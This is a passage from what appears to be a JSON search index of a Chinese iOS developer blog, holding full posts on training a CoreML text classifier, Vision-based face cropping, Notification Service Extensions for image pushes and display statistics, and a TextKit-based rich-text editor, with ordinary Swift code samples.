Touch所以實際能做的功能又更少了，只能以輔助、增加體驗為主。p.s.如果你測的夠細會發現以上效果，在CollectionView滑動中圖有部分已經滑出畫面這時按壓就會出現以上情況😅有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 540 Total Views Last Statistics Date: 2025-01-19 | 528 Views on Medium. " }, { "title": "嚐鮮 iOS 12 CoreML — 使用機器學習自動預測文章分類，連模型也自己訓練！", "url": "/posts/793bf2cdda0f/", "categories": "ZRealm Dev.", "tags": "swift, ios, machine-learning, natural-language-process, ios-app-development", "date": "2018-10-17 23:20:35 +0800", "snippet": "嚐鮮 iOS 12 CoreML — 使用機器學習自動預測文章分類，連模型也自己訓練！探索CoreML 2.0，如何轉換或訓練模型及將其應用在實際產品上接續 上一篇 針對在 iOS上使用機器學習的研究，本篇正式切入使用CoreML首先簡述一下歷史，蘋果在2017年發布了CoreML(包含上篇文章介紹的Vision) 機器學習框架；2018緊接著推出CoreML 2.0，除 效能提升 外還支援...", "content": "嚐鮮 iOS 12 CoreML — 使用機器學習自動預測文章分類，連模型也自己訓練！探索CoreML 2.0，如何轉換或訓練模型及將其應用在實際產品上接續 上一篇 針對在 iOS上使用機器學習的研究，本篇正式切入使用CoreML首先簡述一下歷史，蘋果在2017年發布了CoreML(包含上篇文章介紹的Vision) 機器學習框架；2018緊接著推出CoreML 2.0，除 效能提升 外還支援 自訂客製化CoreML模型 。前言如果你只是聽過「機器學習」這個名詞而不清楚他的意思的話，這邊用一句話簡單說明： 「依照你過往的經驗去預測未來同樣事情的結果」 例如：我吃蛋餅要加番茄醬，買過幾次後早餐店老闆娘就會記得，「帥哥，加番茄醬？」我回答：「是」 — 老闆娘預測正確；若回答「不是，因為是蘿蔔糕+蛋餅」 — 老闆娘記得並再下次遇到相同情況修正他的問題． 輸入的資料：蛋餅、起司蛋餅、蛋餅+蘿蔔糕、蘿蔔糕、蛋 輸出的資料：要加番茄醬/不加番茄醬 模型：老闆娘的記憶跟判斷其實我對機器學習的認知，也是在純粹知道概念理論，但沒實際深入了解過，如有錯誤請大家多多指教提到這就要順便拜🛐一下蘋果大神，把機器學習產品化，只要知道基本概念就能操作，不用具備龐大的知識基礎，降低入門門檻，我自己也是在實作過這個範例後，才第一次覺得有接觸到機器學習的踏實感，讓我對這個項目產生很大的興趣．開始第一步，最重要的當然是前面所提到的「模型」，模型從哪來呢？有三種方式： 網路找別人訓練好的模型並轉成CoreML的格式Awesome-CoreML-Models 這個GitHub專案搜集很多別人訓練好的模型模型轉換可參考 官網 或網路資料 蘋果 Machine Learning官網 最下方的 Download Core ML Models ，可以下載蘋果幫我們訓練好的模型 (主要是拿來學習或測試而已) 運用工具自己訓練模型🏆所以，能做什麼？ 圖片辨識 🏆 文字內容識別分類🏆 文字斷詞 文字語言判斷 名詞識別斷詞請參考 在 iOS App 中進行自然語言處理：初探 NSLinguisticTagger今日主要重點 — 文字內容識別分類＋ 自己訓練模型講白話就是，我們給機器「文字內容」跟「分類」訓練電腦對未來的資料做分類．例如：「點擊查看最新優惠！」、「1000$購物金馬上領」=&gt;「廣告」；「Alan發送一則訊息給您」、「您的帳戶即將到期」=&gt;「重要事項」實際應用：垃圾信件判別、標籤產生、分類預測p.s 由於圖片辨識我還沒想到能訓練它做什麼，所以就沒去研究了；有興趣的朋友可以看 這篇 ，官方有提供圖片的GUI訓練工具 很方便！！需求工具： MacOS Mojave⬆ + Xcode 10訓練工具： BlankSpace007/TextClassiferPlayground （官方只提供 圖片的GUI訓練工具 ，文字的要自己寫；這是由網路大神提供的第三方工具）準備訓練資料：資料結構如上圖，支援.json,.csv檔準備好要拿來訓練的資料，這裡以用Phpmyadmin(Mysql) 匯出訓練資料SELECT `title` AS `text`,`type` AS `label` FROM `posts` WHERE `status` = '1'匯出方式更改成JSON格式[ {\"type\":\"header\",\"version\":\"4.7.5\",\"comment\":\"Export to JSON plugin for PHPMyAdmin\"}, {\"type\":\"database\",\"name\":\"db\"}, {\"type\":\"table\",\"name\":\"posts\",\"database\":\"db\",\"data\": //以上刪除 [ { \"label\":\"\", \"text\":\"\" } ] //以下刪除 }]打開剛下載的JSON檔案，只留下中間DATA結構裡的內容使用訓練工具：下載好訓練工具後，點擊 TextClassifer.playground 打開 Playground點擊紅匡執行-&gt;點擊綠匡切換View顯示將JSON檔案拉入GUI工具打開下方Console查看訓練進度，看到「測試正確率」這行代表已完成模型訓練資料太多就要考驗考驗你的電腦處理能力。填寫基本訊息後按「保存」保存下訓練好的模型檔案CoreML 模型檔到此你的模型就已經訓練好囉！是不是很容易具體訓練方式： 先將輸入的語句做斷詞(我想知道婚禮需要準備什麼=&gt;我想,知道,婚禮,需要,準備,什麼)，再看他的分類是什麼做一連串的機器學習計算。 將訓練資料分組，例如: 80% 是拿來訓練另外20%是拿來測試驗證到這邊已經完成大部分的工作，接下來只要把模型檔加入iOS 專案中，寫個幾行程式就行囉。將模型檔案( * .mlmodel) 拖曳/加入專案之中程式部分：import CoreML//if #available(iOS 12.0, *),let prediction = try? textClassifier().prediction(text: \"要預測的文字內容\") { let type = prediction.label print(\"我覺得是...\\(type)\")}完工！待探索問題： 可以支持再學習？ 可以將mlmodel模型檔轉換到其他平台？ 能再iOS上訓練模型？以上三點，目前查到的資料是都不行。結語：目前我將其應用在實務APP上，做文章發文時預測他的分類結婚吧APP我拿去訓練資料約才100筆，目前預測命中率約35%，主要為實驗性質而已。— — — — —就是這麼簡單，完成人生中第一個機器學習項目；其中背景如何運作還有很長的路可以學習，希望這個項目能給大家一些啟發！參考資料： WWDC2018之Create ML(二)有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,625 Total Views Last Statistics Date: 2025-01-19 | 1,612 Views on Medium. " }, { "title": "Vision 初探 — APP 頭像上傳 自動識別人臉裁圖 (Swift)", "url": "/posts/9a9aa892f9a9/", "categories": "ZRealm Dev.", "tags": "swift, machine-learning, facedetection, ios, ios-app-development", "date": "2018-10-17 00:01:24 +0800", "snippet": "Vision 初探 — APP 頭像上傳 自動識別人臉裁圖 (Swift)Vision 實戰應用[2024/08/13 Update] 請參考新文章、新的 API：「 iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework Session 」一樣不多說，先上一張成品圖：優化前 V....", "content": "Vision 初探 — APP 頭像上傳 自動識別人臉裁圖 (Swift)Vision 實戰應用[2024/08/13 Update] 請參考新文章、新的 API：「 iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework Session 」一樣不多說，先上一張成品圖：優化前 V.S 優化後 — 結婚吧APP前陣子iOS 12發佈更新，注意到新開放的CoreML 機器學習框架；覺得挺有趣的，就開始構想如果想用在當前的產品上能放在哪裡？ CoreML嚐鮮文章現已發佈： 使用機器學習自動預測文章分類，連模型也自己訓練CoreML提供文字、圖像的機器學習模型訓練及引用到APP裡的接口，我原先的想法是，使用CoreML來做到人臉識別，解決APP中有裁圖的項目頭或臉被卡掉的問題，如上圖左所示，若人臉出現在周圍則很容易因為縮放＋裁圖造成臉不完整．經過網路搜尋一番後才發現我學識短淺，這個功能在iOS 11就已發佈：「Vision」框架，支援文字偵測、人臉偵測、圖像比對、QRCODE偵測、物件追蹤…功能這邊使用的就是其中的人臉偵測項目，經優化後如右圖所示；找到人臉並以此為中心裁圖．實戰開始：首先我們先做能標記人臉位置的功能，初步認識一下Vision怎麼用Demo APP完成圖如上所示，能標記出照片中人臉的位置p.s 僅能標記「人臉」，整個頭包含頭髮並不行😅這塊程式主要分為兩部分，第一部分要解決 圖片原尺寸縮放放入 ImageView時會留白的狀況；簡單來說我們要的是Image的Size多大，ImageView的Size就有多大，若直接放入圖片會造成如下走位情形你可能會想說直接改ContentMode變成fill、fit、redraw，但就會變形或圖片被卡掉let ratio = UIScreen.main.bounds.size.width//這邊是因為我UIIMAGEVIEW 那邊設定左右對齊0，寬高比1:1let sourceImage = UIImage(named: \"Demo2\")?.kf.resize(to: CGSize(width: ratio, height: CGFloat.leastNonzeroMagnitude), for: .aspectFill)//使用KingFisher的圖片變形功能，已寬為基準，高度自由imageView.contentMode = .redraw//contentMode使用redraw填滿imageView.image = sourceImage//賦予圖片imageViewConstraints.constant = (ratio - (sourceImage?.size.height ?? 0))imageView.layoutIfNeeded()imageView.sizeToFit()//這一塊是我去改變 imageView的Constraints，詳情可看文末完整範例以上就是針對圖片做的處理裁圖部分使用Kingfisher幫助我們，也可替換成其他套件或自刻方法第二部分，進入重點直接看Codeif #available(iOS 11.0, *) { //iOS 11之後才支援 let completionHandle: VNRequestCompletionHandler = { request, error in if let faceObservations = request.results as? [VNFaceObservation] { //辨識到的臉臉們 DispatchQueue.main.async { //操作UIVIEW，切回主執行緒 let size = self.imageView.frame.size faceObservations.forEach({ (faceObservation) in //坐標系轉換 let translate = CGAffineTransform.identity.scaledBy(x: size.width, y: size.height) let transform = CGAffineTransform(scaleX: 1, y: -1).translatedBy(x: 0, y: -size.height) let transRect = faceObservation.boundingBox.applying(translate).applying(transform) let markerView = UIView(frame: transRect) markerView.backgroundColor = UIColor.init(red: 0/255, green: 255/255, blue: 0/255, alpha: 0.3) self.imageView.addSubview(markerView) }) } } else { print(\"未偵測到任何臉\") } } //辨識請求 let baseRequest = VNDetectFaceRectanglesRequest(completionHandler: completionHandle) let faceHandle = VNImageRequestHandler(ciImage: ciImage, options: [:]) DispatchQueue.global().async { //辨識需要時間，所以放入背景子執行緒執行，避免當前畫面卡住 do{ try faceHandle.perform([baseRequest]) }catch{ print(\"Throws：\\(error)\") } } } else { // print(\"不支援\")}主要要注意的是，坐標系轉換部分；辨識出來的結果是Image的原始座標；我們須將它轉換成包在外面的ImageView的實際座標才能正確地使用它．再來我們來做今天的重頭戲 — 依照人臉的位置裁切出大頭貼的正確位置let ratio = UIScreen.main.bounds.size.width//這邊是因為我UIIMAGEVIEW 那邊設定左右對齊0，寬高比1:1，詳情可看文末完整範例let sourceImage = UIImage(named: \"Demo\")imageView.contentMode = .scaleAspectFill//使用scaleAspectFill模式填滿imageView.image = sourceImage//直接賦予原圖片，我們之後再操作if let image = sourceImage,#available(iOS 11.0, *),let ciImage = CIImage(image: image) { let completionHandle: VNRequestCompletionHandler = { request, error in if request.results?.count == 1,let faceObservation = request.results?.first as? VNFaceObservation { //ㄧ張臉 let size = CGSize(width: ratio, height: ratio) let translate = CGAffineTransform.identity.scaledBy(x: size.width, y: size.height) let transform = CGAffineTransform(scaleX: 1, y: -1).translatedBy(x: 0, y: -size.height) let finalRect = faceObservation.boundingBox.applying(translate).applying(transform) let center = CGPoint(x: (finalRect.origin.x + finalRect.width/2 - size.width/2), y: (finalRect.origin.y + finalRect.height/2 - size.height/2)) //這裡是計算臉的範圍中間點位置 let newImage = image.kf.resize(to: size, for: .aspectFill).kf.crop(to: size, anchorOn: center) //將圖片依照中間點裁切 DispatchQueue.main.async { //操作UIVIEW，切回主執行緒 self.imageView.image = newImage } } else { print(\"偵測到多張臉或沒有偵測到臉\") } } let baseRequest = VNDetectFaceRectanglesRequest(completionHandler: completionHandle) let faceHandle = VNImageRequestHandler(ciImage: ciImage, options: [:]) DispatchQueue.global().async { do{ try faceHandle.perform([baseRequest]) }catch{ print(\"Throws：\\(error)\") } }} else { print(\"不支援\")}道理跟標記人臉位置差不多，差別在大頭貼的部分是固定尺寸(如:300x300)，所以我們略過前面需要讓Image適應ImageView的第一部分另一個差別是我們要多計算人臉範圍的中心點，並以這個中心點為準做裁切圖片紅點為臉的範圍中心點完成效果圖：頓丹前的那一秒是原始圖位置完整APP範例:程式碼已上傳至Github： 請點此有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,301 Total Views Last Statistics Date: 2025-01-19 | 1,276 Views on Medium. " }, { "title": "iOS ≥ 10 Notification Service Extension 應用 (Swift)", "url": "/posts/cb6eba52a342/", "categories": "ZRealm Dev.", "tags": "swift, push-notification, notificationservice, ios, ios-app-development", "date": "2018-10-15 23:44:01 +0800", "snippet": "iOS ≥ 10 Notification Service Extension 應用 (Swift)圖片推播、推播顯示統計、推播顯示前處理關於基礎的推播建置、推播原理；網路資料很多，這邊就不再論述，本篇主要重點在如何讓APP支援圖片推播及運用新特性達成更精準的推播顯示統計．如上圖所示，Notification Service Extension讓你在APP收到推播後能針對推播做預處理，然後才...", "content": "iOS ≥ 10 Notification Service Extension 應用 (Swift)圖片推播、推播顯示統計、推播顯示前處理關於基礎的推播建置、推播原理；網路資料很多，這邊就不再論述，本篇主要重點在如何讓APP支援圖片推播及運用新特性達成更精準的推播顯示統計．如上圖所示，Notification Service Extension讓你在APP收到推播後能針對推播做預處理，然後才顯示推播內容官方文件寫到，我們針對推播進來的內容做處理時，處理時限大約30秒鐘，如果超過30秒還沒CallBack，推播就會繼續執行，出現在使用者的手機．支援度iOS ≥ 10.030秒可以幹嘛？ (目標1) 從推播內容的圖片連結欄位下載圖片回來，並附加到推播內容上🏆 (目標2) 統計推播有無顯示🏆 推播內容修改、重組內容 推播內容加解密(解密)顯示 決定推播要不要顯示？ =&gt;&gt; 答案：不行首先，後端推播程式的 Payload 部分後端在推播時的結構要多加上一行 “mutable-content\":1 系統收到推播才會執行Notification Service Extension{ \"aps\": { \"alert\": { \"title\": \"新文章推薦給您\", \"body\": \"立即查看\" }, \"mutable-content\":1, \"sound\": \"default\", \"badge\": 0 }}And… 第一步，為專案新建一個TargetStep 1. Xcode -&gt; File -&gt; New -&gt; TargetStep 2. iOS -&gt; Notification Service Extension -&gt; NextStep 3. 輸入Product Name -&gt; FinishStep 4. 點選 Activate第二步，撰寫推播內容處理程式找到Product Name/NotificationService.swift檔import UserNotificationsclass NotificationService: UNNotificationServiceExtension { var contentHandler: ((UNNotificationContent) -&gt; Void)? var bestAttemptContent: UNMutableNotificationContent? override func didReceive(_ request: UNNotificationRequest, withContentHandler contentHandler: @escaping (UNNotificationContent) -&gt; Void) { self.contentHandler = contentHandler bestAttemptContent = (request.content.mutableCopy() as? UNMutableNotificationContent) if let bestAttemptContent = bestAttemptContent { // Modify the notification content here... // 推播內容在這處理，Load 圖片回來 bestAttemptContent.title = \"\\(bestAttemptContent.title) [modified]\" contentHandler(bestAttemptContent) } } override func serviceExtensionTimeWillExpire() { // Called just before the extension will be terminated by the system. // Use this as an opportunity to deliver your \"best attempt\" at modified content, otherwise the original push payload will be used. // 要逾時了，不管圖片 只改標題內容就好 if let contentHandler = contentHandler, let bestAttemptContent = bestAttemptContent { contentHandler(bestAttemptContent) } }}如上程式碼，NotificationService有兩個接口；第一個是 didReceive 當有推播進來時會觸發這個function，其中當處理完畢後需要呼叫 contentHandler(bestAttemptContent) 這個CallBack Method告知系統如果時間過久都沒呼叫CallBack Method，就會觸發第二個 function serviceExtensionTimeWillExpire() 已逾時，基本上已回天乏術，只能做一些收尾的動作(例如：單純改改標題、內容，不Load網路資料了)實戰範例這裡假設我們的 Payload 如下{ \"aps\": { \"alert\": { \"push_id\":\"2018001\", \"title\": \"新文章推薦給您\", \"body\": \"立即查看\", \"image\": \"https://d2uju15hmm6f78.cloudfront.net/image/2016/12/04/3113/2018/09/28/trim_153813426461775700_450x300.jpg\" }, \"mutable-content\":1, \"sound\": \"default\", \"badge\": 0 }}「push_id」跟「image」都是我自訂的欄位，push_id用於辨識推播方便我們傳回伺服器做統計；image 則是推播要附加的圖片內容之圖片網址override func didReceive(_ request: UNNotificationRequest, withContentHandler contentHandler: @escaping (UNNotificationContent) -&gt; Void) { self.contentHandler = contentHandler bestAttemptContent = (request.content.mutableCopy() as? UNMutableNotificationContent) if let bestAttemptContent = bestAttemptContent { guard let info = request.content.userInfo[\"aps\"] as? NSDictionary,let alert = info[\"alert\"] as? Dictionary&lt;String,String&gt; else { contentHandler(bestAttemptContent) return //推播內容格式不如預期，不處理 } //目標2: //回傳Server，告知推播有顯示 if let push_id = alert[\"push_id\"],let url = URL(string: \"顯示統計API網址\") { var request = URLRequest(url: url, cachePolicy: .reloadIgnoringLocalCacheData, timeoutInterval: 30) request.httpMethod = \"POST\" request.addValue(UserAgent, forHTTPHeaderField: \"User-Agent\") var httpBody = \"push_id=\\(push_id)\" request.addValue(\"application/x-www-form-urlencoded\", forHTTPHeaderField: \"Content-Type\") request.httpBody = httpBody.data(using: .utf8) let task = URLSession.shared.dataTask(with: request) { (data, response, error) in } DispatchQueue.global().async { task.resume() //異步處理，不管他 } } //目標1: guard let imageURLString = alert[\"image\"],let imageURL = URL(string: imageURLString) else { contentHandler(bestAttemptContent) return //若無附圖片，則不用特別處理 } let dataTask = URLSession.shared.dataTask(with: imageURL) { (data, response, error) in guard let fileURL = NSURL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent(imageURL.lastPathComponent) else { contentHandler(bestAttemptContent) return } guard (try? data?.write(to: fileURL)) != nil else { contentHandler(bestAttemptContent) return } guard let attachment = try? UNNotificationAttachment(identifier: \"image\", url: fileURL, options: nil) else { contentHandler(bestAttemptContent) return } //以上為讀取圖片連結並下載到手機並放入建立UNNotificationAttachment bestAttemptContent.categoryIdentifier = \"image\" bestAttemptContent.attachments = [attachment] //為推播添加附件圖片 bestAttemptContent.body = (bestAttemptContent.body == \"\") ? (\"立即查看\") : (bestAttemptContent.body) //如果body為空，則用預設內容\"立即查看\" contentHandler(bestAttemptContent) } dataTask.resume() }}serviceExtensionTimeWillExpire 的部分我沒特別處理什麼，就不貼了；關鍵還是上述 didReceive 的程式碼可以看到當接受到有推播通知時，我們先Call Api告訴後端有收到並將顯示推播了，方便我們後台做推播統計；然後若有附加圖片再對圖片進行處理．In-App狀態時：ㄧ樣會觸發Notification Service Extension didReceive 再觸發AppDelegate的 func application( _ application: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable : Any ], fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -&gt; Void) 方法附註：關於圖片推播的部分你還可以….使用 Notification Content Extension 自訂推播按壓時要顯示的UIView(可以自己刻)，還有按壓的動作可參考這篇： iOS10推送通知进阶(Notification Extension）iOS 12之後支援更多動作處理： iOS 12 新通知功能：添加互動性 在通知中實作複雜功能Notification Content Extension的部分，我只拉了一個能展示圖片推播的UIView 並沒有做太多琢磨：結婚吧APP有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 5,201 Total Views Last Statistics Date: 2025-01-19 | 5,090 Views on Medium. " }, { "title": "iOS UITextView 文繞圖編輯器 (Swift)", "url": "/posts/e37d66ea1146/", "categories": "ZRealm Dev.", "tags": "swift, ios, mobile-app-development, uitextview, ios-app-development", "date": "2018-10-14 02:07:49 +0800", "snippet": "iOS UITextView 文繞圖編輯器 (Swift)實戰路線目標功能：APP上有一個讓使用者能發表文章的討論區功能，發表文章功能介面需要能輸入文字、插入多張圖片、支援文繞圖穿插．功能需求： 能輸入多行文字 能在行中穿插圖片 能上傳多張圖片 能隨意移除插入的圖片 圖片上傳效果/失敗處理 能將輸入內容轉譯成可傳遞文本 EX: BBCODE先上個成品效果圖：結婚吧APP開始：第一...", "content": "iOS UITextView 文繞圖編輯器 (Swift)實戰路線目標功能：APP上有一個讓使用者能發表文章的討論區功能，發表文章功能介面需要能輸入文字、插入多張圖片、支援文繞圖穿插．功能需求： 能輸入多行文字 能在行中穿插圖片 能上傳多張圖片 能隨意移除插入的圖片 圖片上傳效果/失敗處理 能將輸入內容轉譯成可傳遞文本 EX: BBCODE先上個成品效果圖：結婚吧APP開始：第一章什麼？你說第一章？不就用UITextView就能做到編輯器功能，哪來還需要分到「章節」；是的，我一開始的反應也是如此，直到我開始做才發現事情沒有那麼簡單，其中苦惱了我兩個星期、翻片國內外各種資料最後才找到解法，實作的心路歷程就讓我娓娓道來….如果想直接知道最終解法，請直接跳到最後一章(往下滾滾滾滾滾)．一開始文字編輯器理所當然是使用UITextView元件，看了一下文件UITextView attributedText 自帶 NSTextAttachment物件 可以附加圖片實做出文繞圖效果，程式碼也很簡單：let imageAttachment = NSTextAttachment()imageAttachment.image = UIImage(named: \"example\")self.contentTextView.attributedText = NSAttributedString(attachment: imageAttachment)當初天真的我還很開心想說蠻簡單的啊、好方便；問題現在才正要開始： 圖片要能是從本地選擇&amp;上傳：這好解決，圖片選擇器我使用 TLPhotoPicker 這個套件(支援多圖選擇/客製化設定/切換相機拍照/Live Photos)，具體作法就是 TLPhotoPicker選完圖片Callback後將PHAsset轉成UIImage塞進去imageAttachment.image並預先在背景上傳圖片至Server。 圖片上傳要有效果並能添加互動操作(點擊查看原圖/點擊X能刪除)：沒做出來，找不到NSTextAttachment有什麼辦法能做到這項需求，不過這功能沒有還行反正還是能刪除(在圖片後按鍵盤上的「Back」鍵能刪除圖片)，我們繼續… 原始圖檔案過大，上傳慢、插入慢、吃效能：插入及上傳前先Resize過，用 Kingfisher 的resizeTo 圖片插入在游標停留的位置：這裡就要將原本的Code改成如下let range = self.contentTextView.selectedRange.location ?? NSRange(location: 0, length: 0)let combination = NSMutableAttributedString(attributedString: self.contentTextView.attributedText) //取得當前內容combination.insert(NSAttributedString(attachment: imageAttachment), at: range)self.contentTextView.attributedText = combination //回寫回去 圖片上傳失敗處理：這裡要說一下，我實際另外寫了一個Class 擴充原始的 NSTextAttachment 目的就是要多塞個屬性存識別用的值class UploadImageNSTextAttachment:NSTextAttachment { var uuid:String?}上傳圖片時改成：let id = UUID().uuidStringlet attachment = UploadImageNSTextAttachment()attachment.uuid = id有辦法辨識NSTextAttachment的對應之後，我們就能針對上傳失敗的圖片，去attributedTextd裡做NSTextAttachment搜索，找到他並取代成錯誤提示圖或直接移除if let content = self.contentTextView.attributedText { content.enumerateAttributes(in: NSMakeRange(0, content.length), options: NSAttributedString.EnumerationOptions(rawValue: 0)) { (object, range, stop) in if object.keys.contains(NSAttributedStringKey.attachment) { if let attachment = object[NSAttributedStringKey.attachment] as? UploadImageNSTextAttachment,attachment.uuid == \"目標ID\" { attachment.bounds = CGRect(x: 0, y: 0, width: 30, height: 30) attachment.image = UIImage(named: \"IconError\") let combination = NSMutableAttributedString(attributedString: content) combination.replaceCharacters(in: range, with: NSAttributedString(attachment: attachment)) //如要直接移除可用deleteCharacters(in: range) self.contentTextView.attributedText = combination } } }}克服上述問題後，程式碼大約會長成這樣：class UploadImageNSTextAttachment:NSTextAttachment { var uuid:String?}func dismissPhotoPicker(withTLPHAssets: [TLPHAsset]) { //TLPhotoPicker 圖片選擇器的Callback let range = self.contentTextView.selectedRange.location ?? NSRange(location: 0, length: 0) //取得游標停留位置，無則從頭 guard withTLPHAssets.count &gt; 0 else { return } DispatchQueue.global().async { in //在背景處理 let orderWithTLPHAssets = withTLPHAssets.sorted(by: { $0.selectedOrder &gt; $1.selectedOrder }) orderWithTLPHAssets.forEach { (obj) in if var image = obj.fullResolutionImage { let id = UUID().uuidString var maxWidth:CGFloat = 1500 var size = image.size if size.width &gt; maxWidth { size.width = maxWidth size.height = (maxWidth/image.size.width) * size.height } image = image.resizeTo(scaledToSize: size) //縮圖 let attachment = UploadImageNSTextAttachment() attachment.bounds = CGRect(x: 0, y: 0, width: size.width, height: size.height) attachment.uuid = id DispatchQueue.main.async { //切回主執行緒更新UI插入圖片 let combination = NSMutableAttributedString(attributedString: self.contentTextView.attributedText) attachments.forEach({ (attachment) in combination.insert(NSAttributedString(string: \"\\n\"), at: range) combination.insert(NSAttributedString(attachment: attachment), at: range) combination.insert(NSAttributedString(string: \"\\n\"), at: range) }) self.contentTextView.attributedText = combination } //上傳圖片至Server //Alamofire post or.... //POST image //if failed { if let content = self.contentTextView.attributedText { content.enumerateAttributes(in: NSMakeRange(0, content.length), options: NSAttributedString.EnumerationOptions(rawValue: 0)) { (object, range, stop) in if object.keys.contains(NSAttributedStringKey.attachment) { if let attachment = object[NSAttributedStringKey.attachment] as? UploadImageNSTextAttachment,attachment.uuid == obj.key { //REPLACE: attachment.bounds = CGRect(x: 0, y: 0, width: 30, height: 30) attachment.image = //ERROR Image let combination = NSMutableAttributedString(attributedString: content) combination.replaceCharacters(in: range, with: NSAttributedString(attachment: attachment)) //OR DELETE: //combination.deleteCharacters(in: range) self.contentTextView.attributedText = combination } } } } //} // } } }}到此差不多問題都解決了，那是什麼苦惱了我兩週呢？答：「記憶體」問題iPhone 6頂不住啊!以上做法插入超過5張圖片，UITextView就會開始卡頓；到一個程度就會因為記憶體負荷不了APP直接閃退p.s 試過各種壓縮/其他儲存方式，結果依然推測原因是，UITextView沒有針對圖片的NSTextAttachment做Reuse，你所插入的所有圖片都Load在記憶體之中不會釋放；所以除非是拿來穿插表情符號那種小圖😅，不然根本不能拿來做文繞圖第二章發現記憶體這個「硬傷」後，繼續在網路上搜索解決方案，得到以下其他做法： 用WebView嵌套HTML檔案( &lt;div contentEditable=”true”&gt;&lt;/div&gt;)並用JS跟WebView做交互處理 用UITableView结合UITextView，能Reuse 基於TextKit自行擴充UITextView🏆第一項用WebView嵌套HTML檔案的做法；考量到效能跟使用者體驗，所以不考慮，有興趣的朋友可以在Github搜尋相關的解決方案(EX: RichTextDemo )第二項用UITableView结合UITextView我實作了大約7成出來，具體大約是每一行都是一個Cell，Cell有兩種，一種是UITextView另一種是UIImageView，圖片一行文字一行；內容必須用陣列去儲存，避免Reuse過程消失能優秀的Reuse解決記憶體問題，但做到後面還是放棄了，在 控制行尾按Return要能新建一行並跳到該行 和 控制行頭按Back鍵要能跳到上一行(若當前為空行要能刪除該行) 這兩個部分上吃足苦頭，非常難控制有興趣的朋友可參考： MMRichTextEdit 」最終章走到這裡已經耗費了許多時間，開發時程嚴重拖延；目前最終解法就是用TextKit這裡附上兩篇找到的文章給有興趣研究的朋友： TextKit 探究 从UITextView看文字绘制优化但有一定的學習門檻，對我這個菜鳥來說太難了，再說時間也已不夠，只能漫無目的在Github尋找他山之石借借用用最終找到 XLYTextKitExtension 這個項目，可以直接引入Code使用✔ 讓 NSTextAttachment 支援自訂義UIView 要加什麼交互操作都可以✔ NSTextAttachment 可以Reuse 不會撐爆記憶體具體實作方式跟 第一章 差不多，就只差在原本是用NSTextAttachment而現在改用XLYTextAttachment針對要使用的UITextView:contentTextView.setUseXLYLayoutManager()Tip 1:插入NSTextAttachment的地方改為let combine = NSMutableAttributedString(attributedString: NSAttributedString(string: \"\"))let imageView = UIView() // your custom viewlet imageAttachment = XLYTextAttachment { () -&gt; UIView in return imageView}imageAttachment.id = idimageAttachment.bounds = CGRect(x: 0, y: 0, width: size.width, height: size.height)combine.append(NSAttributedString(attachment: imageAttachment))self.contentTextView.textStorage.insert(combine, at: range)Tip 2:NSTextAttachment搜索改為self.contentTextView.textStorage.enumerateAttribute(NSAttributedStringKey.attachment, in: NSRange(location: 0, length: self.contentTextView.textStorage.length), options: []) { (value, range, stop) in if let attachment = value as? XLYTextAttachment { //attachment.id }}Tip 3:刪除NSTextAttachment項目改為self.contentTextView.textStorage.deleteCharacters(in: range)Tip 4:取得當前內容長度self.contentTextView.textStorage.lengthTip 5:刷新Attachment的Bounds大小主因是為了使用者體驗；插入圖片時我會先塞一張loading圖，插入的圖片在背景壓縮後才會替換上去，要去更新TextAttachment的Bounds成Resize後大小self.contentTextView.textStorage.addAttributes([:], range: range)(新增空屬性，觸發刷新)Tip 6: 將輸入內容轉譯成可傳遞文本運用Tip 2搜索全部輸入內容並將找到的Attachment取出ID組合成類似[ [ID] ]格式傳遞Tip 7: 內容取代self.contentTextView.textStorage.replaceCharacters(in: range,with: NSAttributedString(attachment: newImageAttachment))Tip 8: 正規表示法匹配內容所在Rangelet pattern = \"(\\\\[\\\\[image_id=){1}([0-9]+){1}(\\\\]\\\\]){1}\"let textStorage = self.contentTextView.textStorageif let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive) { while true { let range = NSRange(location: 0, length: textStorage.length) if let match = regex.matches(in: textStorage.string, options: .withTransparentBounds, range: range).first { let matchString = textStorage.attributedSubstring(from: match.range) //FINDED! } else { break } }}注意：如果你要搜尋＆取代項目，需要使用While迴圈，不然當有多個搜尋結果時，找到第一個並取代後，後面的搜尋結果的Range就會錯誤導致閃退．結語目前使用此方法完成成品並上線了，還沒遇到有什麼問題；有時間我再來好好探究一下其中的原理吧！這篇比較不是教學文章，而是個人解題心得分享；如果您也在實作類似功能，希望有幫助到你，有任何問題及指教歡迎與我聯絡． Medium的正式第一篇延伸閱讀 ZMarkupParser HTML String 轉換 NSAttributedString 工具 手工打造 HTML 解析器的那些事有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,047 Total Views Last Statistics Date: 2025-01-19 | 968 Views on Medium. " }, { "title": "Medium的第一篇", "url": "/posts/b7a3fb3d5531/", "categories": "ZRealm Life.", "tags": "blog, blogger, developer, 生活, medium", "date": "2018-10-06 12:53:36 +0800", "snippet": "萬事起頭難已經超過4年沒有在經營Blog，之前的廣告收益尾款US$88就這樣一直卡著，最近發現可以主動要求取消Adsense帳戶，只要達到最低給付額度Google就會把最後一筆收益給你；這也算是給了我一個動力再回來寫Blog．初來乍到，就用“萬事起頭難” 這個簡單的標題當作開端回想起寫Blog的歷史，大約是在國中正值最瘋遊戲的時期，那時候家中電腦很爛基本沒什麼遊戲可以玩，但在那個貪玩的年紀，...", "content": "萬事起頭難已經超過4年沒有在經營Blog，之前的廣告收益尾款US$88就這樣一直卡著，最近發現可以主動要求取消Adsense帳戶，只要達到最低給付額度Google就會把最後一筆收益給你；這也算是給了我一個動力再回來寫Blog．初來乍到，就用“萬事起頭難” 